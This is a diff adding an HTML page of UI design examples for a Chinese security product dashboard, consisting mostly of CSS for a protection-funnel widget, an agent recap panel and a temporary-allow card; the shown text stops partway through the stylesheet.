@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>交互借鉴示例 · 德迅安全卫士</title>
+<script src="./support.js"></script>
+<link rel="stylesheet" href="ds/dexun/tokens.css">
+<link rel="stylesheet" href="ds/dexun/components/bundle.css">
+</head>
+<body>
+<x-dc>
+<helmet>
+<style>
+/* afx：affectUI 借鉴示例（2026-11-26）。系统样式：2px 圆角、紧凑间距、主色 #165dff */
+.afx{min-height:100%;padding:36px 40px 56px;background:#f5f6f8;font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;color:rgba(0,0,0,.88);box-sizing:border-box}
+.afx *{box-sizing:border-box}
+.afx-h1{margin:0 0 4px;font-size:22px;font-weight:600;line-height:30px}
+.afx-sub{margin:0 0 24px;font-size:13px;line-height:20px;color:rgba(0,0,0,.55)}
+.afx-sec{margin:0 0 16px;padding:20px 24px 24px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.08)}
+.afx-sh{display:flex;align-items:baseline;gap:10px;margin:0 0 4px}
+.afx-no{display:inline-grid;place-items:center;min-width:20px;height:20px;padding:0 5px;border-radius:2px;background:rgba(0,0,0,.06);font-size:12px;font-weight:600;color:rgba(0,0,0,.61)}
+.afx-st{font-size:16px;font-weight:600}
+.afx-at{font-size:12px;color:rgba(0,0,0,.45)}
+.afx-src{margin-left:auto;font-size:12px;color:rgba(0,0,0,.45)}
+.afx-sd{margin:0 0 16px;font-size:12.5px;line-height:20px;color:rgba(0,0,0,.55)}
+.afx-row2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px;margin-bottom:16px}
+.afx-row2 > .afx-sec{margin:0}
+.afx-btn{display:inline-flex;align-items:center;justify-content:center;gap:4px;height:28px;padding:0 12px;border:0;border-radius:0;background:#fff;box-shadow:inset 0 0 0 1px rgba(0,0,0,.15);font:inherit;font-size:13px;color:rgba(0,0,0,.88);cursor:pointer;white-space:nowrap}
+.afx-btn:hover{box-shadow:inset 0 0 0 1px #165dff;color:#165dff}
+.afx-btn.pr{background:#165dff;box-shadow:none;color:#fff}
+.afx-btn.pr:hover{background:#4080ff;color:#fff}
+.afx-btn.sm{height:24px;padding:0 8px;font-size:12px}
+.afx-btn.dn{background:#f53f3f;color:#fff;box-shadow:none}
+.afx-lk{padding:0;border:0;background:none;font:inherit;font-size:12px;color:#165dff;cursor:pointer;text-decoration:none;white-space:nowrap}
+.afx-lk:hover{color:#4080ff}
+.afx-seg{display:inline-flex;gap:4px}
+.afx-seg button{height:24px;min-width:44px;padding:0 10px;border:0;border-radius:2px;background:rgba(0,0,0,.06);font:inherit;font-size:12px;color:rgba(0,0,0,.61);cursor:pointer}
+.afx-seg button.on{background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.08);color:rgba(0,0,0,.88);font-weight:500}
+
+/* 1 防护漏斗（按 Guardrail Funnel clean 重做） */
+.gf2-cq{container:gf2 / inline-size}
+.gf2{--gfc:#165dff;display:grid;min-width:0;padding:14px 16px 16px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);font-size:13px;line-height:20px;color:rgba(0,0,0,.61)}
+.gf2-bar{display:flex;align-items:center;gap:8px;min-height:24px;margin-bottom:10px}
+.gf2-tt{font-weight:500;color:#000}
+.gf2-tot{font-size:12px;color:rgba(0,0,0,.45)}
+.gf2-tot b{font-weight:500;color:rgba(0,0,0,.88);font-variant-numeric:tabular-nums}
+.gf2-st{display:flex;align-items:center;gap:10px;margin-left:auto}
+.gf2-live{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:500;line-height:16px;color:rgba(0,0,0,.61)}
+.gf2-live i{width:6px;height:6px;border-radius:50%;background:#2fae64}
+.gf2-rg{display:inline-flex;gap:2px}
+.gf2-rg button{height:22px;padding:0 7px;border:0;border-radius:2px;background:transparent;font:inherit;font-size:11px;font-weight:500;line-height:22px;color:rgba(0,0,0,.61);cursor:pointer;transition:background-color .16s,color .16s}
+.gf2-rg button:hover{color:rgba(0,0,0,.88)}
+.gf2-rg button.on{background:rgba(0,0,0,.06);color:rgba(0,0,0,.88)}
+.gf2-stages{position:relative;display:grid;grid-template-columns:minmax(0,1fr) minmax(120px,1.15fr) 96px;grid-template-rows:repeat(5,40px);margin:0 -8px}
+.gf2-list{display:grid;grid-template-columns:subgrid;grid-template-rows:subgrid;grid-column:1/-1;grid-row:1/-1}
+.gf2-row{position:relative;display:grid;grid-template-columns:subgrid;grid-column:1/-1;align-items:center;min-width:0;padding:0 8px;border:0;border-radius:2px;background:none;font:inherit;text-align:left;cursor:pointer;transition:background-color .16s}
+.gf2-row:hover{background:rgba(0,0,0,.03)}
+.gf2-row.on{background:rgba(0,0,0,.045)}
+.gf2-nm{display:grid;min-width:0;padding-right:12px}
+.gf2-hd{display:flex;align-items:center;gap:6px;min-width:0}
+.gf2-ic{display:block;flex:none;width:14px;height:14px;background:currentColor;-webkit-mask-size:contain;mask-size:contain;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat}
+.gf2-lb{min-width:0;overflow:hidden;font-size:12px;line-height:16px;color:rgba(0,0,0,.88);white-space:nowrap;text-overflow:ellipsis}
+.gf2-mt{min-width:0;padding-left:20px;overflow:hidden;font-size:11px;line-height:15px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis;font-variant-numeric:tabular-nums}
+.gf2-gap{display:block}
+.gf2-nums{display:grid;justify-items:end;min-width:0}
+.gf2-cnt{font-size:12px;font-weight:500;line-height:16px;color:rgba(0,0,0,.88);white-space:nowrap;font-variant-numeric:tabular-nums}
+.gf2-pct{font-size:11px;line-height:15px;color:rgba(0,0,0,.45);font-variant-numeric:tabular-nums}
+.gf2-fun{position:relative;grid-column:2;grid-row:1/-1;min-width:0;pointer-events:none}
+.gf2-fun svg{position:absolute;inset:0;width:100%;height:100%;overflow:visible}
+.gf2-tp{fill:var(--gfc);fill-opacity:.035}
+.gf2-st2{position:absolute;left:50%;height:16px;transform:translateX(-50%);animation:gf2Grow .8s cubic-bezier(.32,.72,.24,1) both}
+.gf2-end{position:absolute;inset:0;border-radius:4px;background:color-mix(in srgb,var(--c) 16%,#fff);box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--c) 45%,transparent)}
+.gf2-core{position:absolute;top:0;bottom:0;left:50%;overflow:hidden;border-radius:4px;background:linear-gradient(180deg,color-mix(in srgb,var(--gfc) 17%,#fff),color-mix(in srgb,var(--gfc) 8%,#fff));box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--gfc) 32%,transparent);transform:translateX(-50%)}
+.gf2-core.last{background:color-mix(in srgb,var(--c) 16%,#fff);box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--c) 45%,transparent)}
+.gf2-sh{position:absolute;inset:0;overflow:hidden;border-radius:4px}
+.gf2-sh::after{content:"";position:absolute;top:0;bottom:0;left:0;width:70%;min-width:24px;background:linear-gradient(90deg,rgba(255,255,255,0),rgba(255,255,255,.85),rgba(255,255,255,0));transform:translateX(-100%);animation:gf2Sheen 5.4s ease-in-out infinite both;animation-delay:inherit}
+.gf2-pn{display:grid;gap:10px;min-width:0;margin-top:10px;padding-top:12px;border-top:.5px solid rgba(0,0,0,.06)}
+.gf2-ph{display:flex;align-items:baseline;gap:8px;min-width:0;height:20px}
+.gf2-ph b{flex:none;font-weight:500;color:rgba(0,0,0,.88)}
+.gf2-ph span{min-width:0;overflow:hidden;font-size:11px;line-height:16px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis}
+.gf2-exs{display:grid;grid-auto-rows:48px;gap:6px;height:156px;align-content:start}
+.gf2-ex{display:flex;align-items:center;gap:10px;min-width:0;padding:0 12px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);animation:gf2In .24s cubic-bezier(.32,.72,.24,1) both}
+.gf2-eb{display:grid;flex:1 1 auto;min-width:0}
+.gf2-et{min-width:0;overflow:hidden;font-size:12px;line-height:18px;color:rgba(0,0,0,.88);white-space:nowrap;text-overflow:ellipsis}
+.gf2-et.code{font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace;font-size:11px}
+.gf2-hit{padding:1px 3px;border-radius:2px;background:color-mix(in srgb,var(--c) 14%,transparent);color:color-mix(in srgb,var(--c) 55%,#000)}
+.gf2-em{display:flex;align-items:center;gap:8px;min-width:0;height:15px;font-size:11px;line-height:15px;color:rgba(0,0,0,.45)}
+.gf2-em .r{min-width:0;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
+.gf2-em .t{flex:none;color:rgba(0,0,0,.27);font-variant-numeric:tabular-nums}
+.gf2-act{flex:none;height:24px;padding:0 9px;border:0;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);font:inherit;font-size:12px;font-weight:500;color:#000;white-space:nowrap;cursor:pointer}
+.gf2-act:hover{background:#fafafa}
+.gf2-dn{display:inline-flex;flex:none;align-items:center;gap:4px;font-size:11px;font-weight:500;color:rgba(0,0,0,.45);white-space:nowrap}
+.gf2-dn i{font-style:normal;color:#5fc88a}
+.gf2-pt{display:grid;align-content:center;gap:7px;min-width:0;padding:0 12px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);animation:gf2In .24s both}
+.gf2-pl{display:flex;align-items:baseline;gap:6px;min-width:0;font-size:12px;line-height:16px}
+.gf2-pl .l{color:rgba(0,0,0,.88)}
+.gf2-pl .n{font-size:11px;color:rgba(0,0,0,.45)}
+.gf2-pl .v{margin-left:auto;font-weight:500;color:rgba(0,0,0,.88);font-variant-numeric:tabular-nums}
+.gf2-pl .p{min-width:38px;font-size:11px;color:rgba(0,0,0,.45);text-align:right;font-variant-numeric:tabular-nums}
+.gf2-tr{display:block;height:4px;overflow:hidden;border-radius:2px;background:rgba(0,0,0,.025);box-shadow:inset 0 0 0 .5px rgba(0,0,0,.06)}
+.gf2-fl{display:block;height:100%;border-radius:inherit;background:color-mix(in srgb,var(--c) 45%,#fff);box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--c) 60%,transparent);animation:gf2Fill .7s cubic-bezier(.32,.72,.24,1) both}
+@container gf2 (min-width: 960px){.gf2{grid-template-columns:minmax(0,1fr) minmax(340px,38%);align-items:start}.gf2-bar{grid-column:1/-1}.gf2-stages{grid-column:1}.gf2-pn{grid-column:2;grid-row:2;align-self:stretch;align-content:start;margin:0 0 0 16px;padding:0 0 0 16px;border-top:0;border-left:.5px solid rgba(0,0,0,.06)}.gf2-exs{height:auto}}
+@container gf2 (max-width: 420px){.gf2-stages{grid-template-columns:minmax(0,1fr) minmax(72px,.7fr) 76px}.gf2-ph > span,.gf2-em .t,.gf2-pl .n{display:none}.gf2-ex{gap:8px}.gf2-live span{display:none}}
+@keyframes gf2Grow{from{transform:translateX(-50%) scaleX(0);opacity:0}}
+@keyframes gf2Sheen{0%{transform:translateX(-100%)}40%,100%{transform:translateX(150%)}}
+@keyframes gf2In{from{opacity:0;transform:translateY(3px)}}
+@keyframes gf2Fill{from{width:0}}
+@keyframes afxPulse{0%,100%{opacity:1}50%{opacity:.35}}
+@keyframes afxRise{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.gf2-ic.i-in{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M7 2.5C5.59269 2.66536 4.62427 3.01488 3.89124 3.75363C2.5 5.15575 2.5 7.41242 2.5 11.9258C2.5 16.4391 2.5 18.6958 3.89124 20.0979C5.28249 21.5 7.52166 21.5 12 21.5C16.4783 21.5 18.7175 21.5 20.1088 20.0979C21.5 18.6958 21.5 16.4391 21.5 11.9258C21.5 7.41242 21.5 5.15575 20.1088 3.75363C19.3757 3.01488 18.4073 2.66536 17 2.5'/%3E%3Cpath d='M9.5 8C9.99153 8.5057 11.2998 10.5 12 10.5M14.5 8C14.0085 8.5057 12.7002 10.5 12 10.5M12 10.5V2.5'/%3E%3Cpath d='M21.5 13.5H16.5743C15.7322 13.5 15.0706 14.2036 14.6995 14.9472C14.2963 15.7551 13.4889 16.5 12 16.5C10.5111 16.5 9.70373 15.7551 9.30054 14.9472C8.92942 14.2036 8.26777 13.5 7.42566 13.5H2.5'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M7 2.5C5.59269 2.66536 4.62427 3.01488 3.89124 3.75363C2.5 5.15575 2.5 7.41242 2.5 11.9258C2.5 16.4391 2.5 18.6958 3.89124 20.0979C5.28249 21.5 7.52166 21.5 12 21.5C16.4783 21.5 18.7175 21.5 20.1088 20.0979C21.5 18.6958 21.5 16.4391 21.5 11.9258C21.5 7.41242 21.5 5.15575 20.1088 3.75363C19.3757 3.01488 18.4073 2.66536 17 2.5'/%3E%3Cpath d='M9.5 8C9.99153 8.5057 11.2998 10.5 12 10.5M14.5 8C14.0085 8.5057 12.7002 10.5 12 10.5M12 10.5V2.5'/%3E%3Cpath d='M21.5 13.5H16.5743C15.7322 13.5 15.0706 14.2036 14.6995 14.9472C14.2963 15.7551 13.4889 16.5 12 16.5C10.5111 16.5 9.70373 15.7551 9.30054 14.9472C8.92942 14.2036 8.26777 13.5 7.42566 13.5H2.5'/%3E%3C/svg%3E")}
+.gf2-ic.i-fw{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18.7088 3.49534C16.8165 2.55382 14.5009 2 12 2C9.4991 2 7.1835 2.55382 5.29116 3.49534C4.36318 3.95706 3.89919 4.18792 3.4496 4.91378C3 5.63965 3 6.34248 3 7.74814V11.2371C3 16.9205 7.54236 20.0804 10.173 21.4338C10.9067 21.8113 11.2735 22 12 22C12.7265 22 13.0933 21.8113 13.8269 21.4338C16.4576 20.0804 21 16.9205 21 11.2371L21 7.74814C21 6.34249 21 5.63966 20.5504 4.91378C20.1008 4.18791 19.6368 3.95706 18.7088 3.49534Z'/%3E%3Cpath d='M9 11.5C9 11.5 10.4079 11.7519 11 13.5C11 13.5 12.5 10.5 15 9.5'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18.7088 3.49534C16.8165 2.55382 14.5009 2 12 2C9.4991 2 7.1835 2.55382 5.29116 3.49534C4.36318 3.95706 3.89919 4.18792 3.4496 4.91378C3 5.63965 3 6.34248 3 7.74814V11.2371C3 16.9205 7.54236 20.0804 10.173 21.4338C10.9067 21.8113 11.2735 22 12 22C12.7265 22 13.0933 21.8113 13.8269 21.4338C16.4576 20.0804 21 16.9205 21 11.2371L21 7.74814C21 6.34249 21 5.63966 20.5504 4.91378C20.1008 4.18791 19.6368 3.95706 18.7088 3.49534Z'/%3E%3Cpath d='M9 11.5C9 11.5 10.4079 11.7519 11 13.5C11 13.5 12.5 10.5 15 9.5'/%3E%3C/svg%3E")}
+.gf2-ic.i-ids{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M6.09881 19.5C4.7987 19.3721 3.82475 18.9816 3.17157 18.3284C2 17.1569 2 15.2712 2 11.5V11C2 7.22876 2 5.34315 3.17157 4.17157C4.34315 3 6.22876 3 10 3H11.5M6.5 18C6.29454 19.0019 5.37769 21.1665 6.31569 21.8651C6.806 22.2218 7.58729 21.8408 9.14987 21.0789C10.2465 20.5441 11.3562 19.9309 12.5546 19.655C12.9931 19.5551 13.4395 19.5125 14 19.5C17.7712 19.5 19.6569 19.5 20.8284 18.3284C21.947 17.2098 21.9976 15.4403 21.9999 12'/%3E%3Cpath d='M8 14H14M8 9H11'/%3E%3Cpath d='M15.2 3.2L20.8 8.8M22 6C22 3.79086 20.2091 2 18 2C15.7909 2 14 3.79086 14 6C14 8.20914 15.7909 10 18 10C20.2091 10 22 8.20914 22 6Z'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M6.09881 19.5C4.7987 19.3721 3.82475 18.9816 3.17157 18.3284C2 17.1569 2 15.2712 2 11.5V11C2 7.22876 2 5.34315 3.17157 4.17157C4.34315 3 6.22876 3 10 3H11.5M6.5 18C6.29454 19.0019 5.37769 21.1665 6.31569 21.8651C6.806 22.2218 7.58729 21.8408 9.14987 21.0789C10.2465 20.5441 11.3562 19.9309 12.5546 19.655C12.9931 19.5551 13.4395 19.5125 14 19.5C17.7712 19.5 19.6569 19.5 20.8284 18.3284C21.947 17.2098 21.9976 15.4403 21.9999 12'/%3E%3Cpath d='M8 14H14M8 9H11'/%3E%3Cpath d='M15.2 3.2L20.8 8.8M22 6C22 3.79086 20.2091 2 18 2C15.7909 2 14 3.79086 14 6C14 8.20914 15.7909 10 18 10C20.2091 10 22 8.20914 22 6Z'/%3E%3C/svg%3E")}
+.gf2-ic.i-av{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M19.439 15.439C20.3636 14.5212 21.0775 13.6091 21.544 12.955C21.848 12.5287 22 12.3155 22 12C22 11.6845 21.848 11.4713 21.544 11.045C20.1779 9.12944 16.6892 5 12 5C11.0922 5 10.2294 5.15476 9.41827 5.41827M6.74742 6.74742C4.73118 8.1072 3.24215 9.94266 2.45604 11.045C2.15201 11.4713 2 11.6845 2 12C2 12.3155 2.15201 12.5287 2.45604 12.955C3.8221 14.8706 7.31078 19 12 19C13.9908 19 15.7651 18.2557 17.2526 17.2526'/%3E%3Cpath d='M9.85786 10C9.32783 10.53 9 11.2623 9 12.0711C9 13.6887 10.3113 15 11.9289 15C12.7377 15 13.47 14.6722 14 14.1421'/%3E%3Cpath d='M3 3L21 21'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M19.439 15.439C20.3636 14.5212 21.0775 13.6091 21.544 12.955C21.848 12.5287 22 12.3155 22 12C22 11.6845 21.848 11.4713 21.544 11.045C20.1779 9.12944 16.6892 5 12 5C11.0922 5 10.2294 5.15476 9.41827 5.41827M6.74742 6.74742C4.73118 8.1072 3.24215 9.94266 2.45604 11.045C2.15201 11.4713 2 11.6845 2 12C2 12.3155 2.15201 12.5287 2.45604 12.955C3.8221 14.8706 7.31078 19 12 19C13.9908 19 15.7651 18.2557 17.2526 17.2526'/%3E%3Cpath d='M9.85786 10C9.32783 10.53 9 11.2623 9 12.0711C9 13.6887 10.3113 15 11.9289 15C12.7377 15 13.47 14.6722 14 14.1421'/%3E%3Cpath d='M3 3L21 21'/%3E%3C/svg%3E")}
+.gf2-ic.i-out{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12Z'/%3E%3Cpath d='M8 12.5L10.5 15L16 9'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12Z'/%3E%3Cpath d='M8 12.5L10.5 15L16 9'/%3E%3C/svg%3E")}
+
+/* 2 你不在时（按 Agent Recap clean 重做） */
+.rcp{--rcp-k:#a1a1aa;width:100%;min-width:0;padding:16px 16px 12px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);font-size:13px;line-height:20px;color:rgba(0,0,0,.61)}
+.rcp-hd{display:flex;flex-wrap:wrap;align-items:flex-start;justify-content:space-between;gap:8px 16px}
+.rcp-tt{margin:0;font-size:15px;font-weight:500;line-height:24px;color:#000}
+.rcp-since{display:flex;align-items:center;gap:6px;margin:2px 0 0;font-size:12px;line-height:18px;color:rgba(0,0,0,.45);font-variant-numeric:tabular-nums}
+.rcp-pill{padding:0 6px;border-radius:2px;background:rgba(0,0,0,.05);font-size:11.5px;font-weight:500;line-height:18px;color:rgba(0,0,0,.61)}
+.rcp-cnts{display:flex;flex-wrap:wrap;gap:4px 12px;margin:0;padding:4px 0 0;list-style:none;font-size:12px;line-height:16px;color:rgba(0,0,0,.45);white-space:nowrap}
+.rcp-cnts li{display:inline-flex;align-items:center;gap:5px}
+.rcp-cnts b{font-weight:500;color:rgba(0,0,0,.88);font-variant-numeric:tabular-nums}
+.rcp-ki{flex:none;width:14px;height:14px;color:rgba(0,0,0,.45)}
+.rcp-ch{position:relative;height:96px;margin:14px 0 0;cursor:crosshair}
+.rcp-ch svg{display:block;width:100%;height:100%;overflow:hidden}
+.rcp-grid line{stroke:rgba(0,0,0,.045);stroke-width:1}
+.rcp-line{fill:none;stroke:rgba(0,0,0,.42);stroke-width:1.5;stroke-linejoin:round}
+.rcp-frame{position:absolute;inset:0;border-top:1px solid rgba(0,0,0,.045);border-bottom:1px solid rgba(0,0,0,.045);pointer-events:none}
+.rcp-cur{position:absolute;top:0;bottom:0;width:1px;margin-left:-.5px;background:rgba(0,0,0,.22);pointer-events:none}
+.rcp-dot{position:absolute;width:5px;height:5px;border-radius:50%;background:rgba(0,0,0,.55);box-shadow:0 0 0 1.5px #fff;transform:translate(-50%,-50%) scale(0);transition:transform .36s cubic-bezier(.32,.72,.24,1),background-color .24s}
+.rcp-dot.on{transform:translate(-50%,-50%) scale(1)}
+.rcp-dot.hot{transform:translate(-50%,-50%) scale(1.6)}
+.rcp-dot.k-n{background:#f28a2e}.rcp-dot.k-f{background:#f04438}
+.rcp-dot::after{content:"";position:absolute;inset:-6px;border-radius:50%}
+.rcp-tip{position:absolute;z-index:2;max-width:280px;overflow:hidden;margin-top:-12px;padding:3px 8px;border-radius:2px;background:#18181b;font-size:11.5px;line-height:16px;color:#fafafa;white-space:nowrap;text-overflow:ellipsis;transform:translate(-50%,-100%);pointer-events:none;animation:rcpPop .14s ease both}
+.rcp-tip.s{transform:translate(-12px,-100%)}.rcp-tip.e{transform:translate(calc(-100% + 12px),-100%)}
+.rcp-ends{display:flex;justify-content:space-between;margin:4px 0 0;font-size:10.5px;line-height:14px;color:rgba(0,0,0,.27);font-variant-numeric:tabular-nums}
+.rcp-board{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px;align-items:stretch;margin-top:14px}
+.rcp-lane{padding:4px;border-radius:2px;background:#f4f4f5}
+.rcp-lh{display:flex;align-items:center;justify-content:space-between;height:32px;margin:0;padding:0 10px 0 9px;font-size:11.5px;font-weight:500;line-height:16px;color:rgba(0,0,0,.45)}
+.rcp-lh .l{display:inline-flex;align-items:center;gap:8px}
+.rcp-lh .rcp-ki{width:18px}
+.rcp-ln{display:grid;place-items:center;min-width:20px;height:18px;padding:0 5px;border-radius:2px;background:rgba(0,0,0,.05);font-size:11px;color:rgba(0,0,0,.61);font-variant-numeric:tabular-nums}
+.rcp-cards{display:grid;grid-auto-rows:90px;align-content:start;gap:4px;min-height:278px;margin:0;padding:0;list-style:none}
+.rcp-card{display:grid;grid-template-columns:minmax(0,1fr);align-content:start;gap:2px;min-width:0;padding:9px 10px 9px 9px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);opacity:0;filter:blur(2px);transform:translateY(4px);transition:opacity .32s,filter .32s,transform .42s cubic-bezier(.32,.72,.24,1),box-shadow .16s,background-color .16s}
+.rcp-card.seen{opacity:1;filter:none;transform:none}
+.rcp-card.hot{background:#fafafa;box-shadow:0 0 0 .5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.06)}
+.rcp-ct{display:flex;align-items:center;gap:8px;min-width:0;height:20px}
+.rcp-mk{display:grid;flex:none;place-items:center;width:18px;height:18px;overflow:hidden;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);font-size:10px;font-weight:500;color:rgba(0,0,0,.88);transition:background-color .2s,color .2s}
+.rcp-card.res .rcp-mk{background:rgba(95,200,138,.1);box-shadow:none;color:#1e8a4f}
+.rcp-ctt{flex:1;min-width:0;overflow:hidden;font-weight:500;color:rgba(0,0,0,.88);white-space:nowrap;text-overflow:ellipsis}
+.rcp-card.res .rcp-ctt,.rcp-card.und .rcp-ctt{color:rgba(0,0,0,.45)}
+.rcp-cm{display:flex;align-items:center;gap:8px;min-width:0;height:18px;padding-left:26px}
+.rcp-dt{flex:1;min-width:0;overflow:hidden;font-size:12px;line-height:16px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis}
+.rcp-card.k-f.op .rcp-dt{color:#f04438}
+.rcp-tag{flex:none;padding:0 5px;border-radius:2px;background:rgba(0,0,0,.05);font-size:10.5px;font-weight:500;line-height:16px;color:rgba(0,0,0,.61);font-variant-numeric:tabular-nums}
+.rcp-tm{flex:none;font-size:11px;color:rgba(0,0,0,.27);white-space:nowrap;font-variant-numeric:tabular-nums}
+.rcp-ft{display:flex;align-items:center;justify-content:flex-end;gap:4px;height:24px;margin-top:6px}
+.rcp-stx{display:flex;flex:1;min-width:0;overflow:hidden;font-size:12px;color:rgba(0,0,0,.45);white-space:nowrap}
+.rcp-state{padding:0 6px;border-radius:2px;background:rgba(95,200,138,.1);font-size:11.5px;font-weight:500;line-height:20px;color:#1e8a4f}
+.rcp-state.off{background:rgba(0,0,0,.05);color:rgba(0,0,0,.45)}
+.rcp-btn{display:inline-flex;flex:none;align-items:center;gap:5px;height:24px;margin:0;padding:0 8px;border:0;border-radius:2px;background:none;font:inherit;font-size:12px;font-weight:500;color:rgba(0,0,0,.45);white-space:nowrap;cursor:pointer;transition:background-color .16s,color .16s,transform .16s}
+.rcp-btn:hover{background:rgba(0,0,0,.04);color:rgba(0,0,0,.88)}
+.rcp-btn.main{padding:0 9px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);color:rgba(0,0,0,.88)}
+.rcp-btn.main:hover{background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.12),0 1px 3px rgba(0,0,0,.08)}
+.rcp-btn:active{transform:scale(.97)}
+@keyframes rcpPop{from{opacity:0}}
+@keyframes awPop{from{opacity:0;transform:scale(.2)}to{opacity:1;transform:scale(1)}}
+@keyframes afxFade{to{opacity:1}}
+
+/* 3 临时放行 */
+.pr-w{display:grid;gap:12px}
+.pr-c{border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.1),0 2px 6px rgba(0,0,0,.04)}
+.pr-top{display:flex;align-items:flex-start;gap:10px;padding:14px 16px 0}
+.pr-av{display:grid;flex:none;place-items:center;width:28px;height:28px;border-radius:2px;background:rgba(22,93,255,.1);font-size:12px;font-weight:600;color:#165dff}
+.pr-tt{flex:1;min-width:0}
+.pr-tt b{display:block;font-size:14px;font-weight:600;line-height:22px}
+.pr-tt span{display:block;font-size:12px;line-height:18px;color:rgba(0,0,0,.45)}
+.pr-tag{flex:none;display:inline-flex;align-items:center;height:20px;padding:0 6px;border-radius:2px;background:#ff9c0029;font-size:12px;font-weight:500;color:#b25e00}
+.pr-why{margin:10px 16px 0;padding:8px 10px;border-radius:2px;background:rgba(0,0,0,.03);font-size:12.5px;line-height:20px;color:rgba(0,0,0,.7)}
+.pr-pv{margin:12px 16px 0}
+.pr-pl{margin:0 0 6px;font-size:11px;font-weight:500;letter-spacing:.5px;color:rgba(0,0,0,.45)}
+.pr-pr{display:flex;align-items:center;gap:8px;height:30px;padding:0 10px;border-radius:2px;background:#fafafa;box-shadow:inset 0 0 0 .5px rgba(0,0,0,.06);font-size:12.5px;animation:afxRise .3s both}
+.pr-pr + .pr-pr{margin-top:3px}
+.pr-pr b{font-weight:500}
